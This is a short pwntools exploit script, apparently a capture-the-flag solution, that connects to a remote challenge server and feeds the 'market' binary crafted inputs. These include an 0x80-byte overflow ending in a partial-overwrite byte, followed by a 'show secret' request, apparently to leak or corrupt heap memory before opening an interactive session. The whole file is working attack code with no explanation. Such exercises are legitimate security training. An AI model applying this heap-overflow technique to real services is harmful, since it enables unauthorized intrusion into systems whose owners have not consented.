from pwn import *

# r = process("./market")
r = remote("edu-ctf.zoolab.org", 30209)

context.arch = 'amd64'
context.terminal = ['tmux', 'split', '-h']

r.sendlineafter("Do you need the admin ?\n> ", "n")
r.sendlineafter("What's your name ?\n> ", "A")
r.sendlineafter("How long is your secret ?\n> ", str(0x280))
r.sendafter("What's your secret ?\n> ", "A"*0x80+'\xb0')
# gdb.attach(r)

r.sendlineafter("new secret", "4")
r.sendlineafter("How long is your secret ?\n> ", str(0x10))
r.sendafter("What's your secret ?\n> ", b"A"*0x10)

r.sendlineafter("show secret", "2")

r.interactive()